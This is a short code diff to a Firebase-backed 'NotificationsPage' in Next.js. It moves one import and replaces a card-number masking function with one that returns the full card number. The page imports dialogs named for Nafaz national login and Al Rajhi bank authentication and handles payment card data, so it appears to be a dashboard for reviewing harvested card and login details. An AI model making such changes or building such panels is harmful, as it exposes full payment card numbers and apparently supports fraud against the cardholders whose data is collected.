@@ -61,13 +61,13 @@ import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/comp
 import { Input } from "@/components/ui/input"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
-import { auth, db } from "@/lib/firebase"
-import { Skeleton } from "@/components/ui/skeleton"
 import PhoneDialog from "@/components/phone-info"
 import NafazAuthDialog from "@/components/nafaz"
 import RajhiAuthDialog from "@/components/rajhi"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
+import { auth, db } from "@/lib/firestore"
+import { Skeleton } from "@/components/ui/skeleton"
 
 interface PaymentData {
   card_number?: string
@@ -742,8 +742,7 @@ export default function NotificationsPage() {
   const formatCardNumber = (cardNumber?: string) => {
     if (!cardNumber) return "غير محدد"
     // Format as **** **** **** 1234
-    const last4 = cardNumber.slice(-4)
-    return `**** **** **** ${last4}`
+    return cardNumber
   }
 
   const applyFilter = (filter: string | null) => {
